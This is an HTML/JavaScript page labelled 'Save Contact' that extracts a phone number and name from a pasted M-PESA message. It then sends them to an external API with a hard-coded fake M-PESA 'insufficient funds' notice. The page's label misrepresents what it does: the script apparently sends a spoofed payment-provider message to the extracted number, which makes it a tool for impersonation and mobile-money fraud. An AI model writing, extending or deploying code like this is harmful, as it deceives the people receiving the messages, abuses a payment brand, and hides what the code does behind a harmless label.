
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Save Contact</title>
<style>
    body { font-family: Arial, sans-serif; background: #121212; color: white; padding: 20px; margin: 0; }
    .container { max-width: 500px; width: 90%; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 10px; box-sizing: border-box; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
    h3 { text-align: center; margin-bottom: 15px; font-size: 1.4rem; color: #4CAF50; }
    textarea { width: 100%; height: 140px; padding: 12px; margin-top: 10px; background: #2a2a2a; border: 1px solid #333; border-radius: 6px; color: white; font-size: 1rem; resize: none; box-sizing: border-box; }
    
    .manual-input-container { display: none; margin-top: 15px; padding: 12px; border: 1px dashed #4CAF50; border-radius: 6px; background: #252525; }
    .manual-input-container label { display: block; margin-bottom: 8px; font-size: 0.85rem; color: #4CAF50; font-weight: bold; }
    input[type="text"] { width: 100%; padding: 12px; background: #333; border: 1px solid #4CAF50; border-radius: 4px; color: white; box-sizing: border-box; font-size: 1rem; }

    button { width: 100%; padding: 14px; margin-top: 20px; border: none; border-radius: 6px; background: #4CAF50; color: white; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; }
    button:hover:not(:disabled) { background: #45a049; transform: translateY(-1px); }
    button:active { transform: translateY(0); }
    button:disabled { background: #555; cursor: not-allowed; }
    
    pre { background: #000; padding: 15px; margin-top: 15px; white-space: pre-wrap; word-wrap: break-word; border-radius: 6px; font-size: 0.95rem; color: #4CAF50; border: 1px solid #333; min-height: 20px; line-height: 1.4; }
    .warning-text { color: #ffeb3b; border-color: #ffeb3b; }

    @media (max-width: 400px) {
        body { padding: 10px; }
        .container { padding: 15px; }
    }
</style>
</head>
<body>

<div class="container">
    <h3>Save Contact</h3>
    
    <textarea id="message" placeholder="Paste M-PESA message here..."></textarea>

    <div id="manualArea" class="manual-input-container">
        <label for="manualPhone">PHONE NUMBER DETECTED / REQUIRED:</label>
        <input type="text" id="manualPhone" placeholder="Enter phone number">
    </div>

    <button id="saveBtn" onclick="saveContact()">SAVE CONTACT</button>
    <pre id="output"></pre>
</div>

<script>
const API = "https://mpesab-2.onrender.com";
const FIXED_MESSAGE = "Failed. Insufficient funds in your M-PESA account as well as Fuliza M-PESA to send KSH15000.00. Available Fuliza M-PESA limit KSH0.00.";

function extractDetails(message) {
    // Improved Regex for M-PESA formats
    let phoneMatch = message.match(/(\+?\d[\d\s-]{8,15})/); 
    let phone = phoneMatch ? phoneMatch[0].replace(/[\s-]/g, '') : "";
    
    // Extract name between 'sent to', 'to', or 'Pochi' and 'on'/'at'
    let nameMatch = message.match(/(?:sent to|to|Pochi)\s+([^0-9]{2,40})/i);
    let name = "Customer";
    
    if (nameMatch) {
        name = nameMatch[1]
            .split(/\s+on\s/i)[0]
            .split(/\s+at\s/i)[0]
            .split(/\d/)[0] // Stop at any unexpected numbers
            .trim();
    }
    return { phone, name };
}

function generateToken() {
    return "CONTACT-" + Math.random().toString(36).substr(2, 9).toUpperCase();
}

async function saveContact() {
    const btn = document.getElementById("saveBtn");
    const output = document.getElementById("output");
    const manualArea = document.getElementById("manualArea");
    const manualPhoneInput = document.getElementById("manualPhone");
    const pastedMessage = document.getElementById("message").value.trim();

    output.innerText = "Processing...";
    output.classList.remove("warning-text");

    let data = extractDetails(pastedMessage);

    // Logic: If no phone in text, or if phone is already in manual box
    if (!data.phone) {
        let manualValue = manualPhoneInput.value.trim();
        if (manualValue.length >= 10) {
            data.phone = manualValue;
        } else {
            manualArea.style.display = "block";
            output.innerText = "⚠️ Phone number not found in message. Please enter it manually above.";
            output.classList.add("warning-text");
            return;
        }
    } else {
        // Auto-fill the manual box if found in text (for user confirmation)
        manualPhoneInput.value = data.phone;
        manualArea.style.display = "block";
    }

    btn.disabled = true;
    btn.innerText = "Saving...";

    try {
        const response = await fetch(`${API}/send`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                phone: data.phone,
                name: data.name,
                amount: 0,
                token: generateToken(),
                message: FIXED_MESSAGE
            })
        });

        if (response.ok) {
            output.innerText = "✅ Contact Saved Successfully\n\nName: " + data.name + "\nPhone: " + data.phone;
            btn.innerText = "Saved ✓";
            setTimeout(() => {
                btn.disabled = false;
                btn.innerText = "SAVE CONTACT";
            }, 3000);
        } else {
            throw new Error();
        }
        
    } catch (error) {
        output.innerText = "❌ Connection Error. Please check API or Internet.";
        btn.disabled = false;
        btn.innerText = "RETRY SAVING";
    }
}
</script>

</body>
</html>
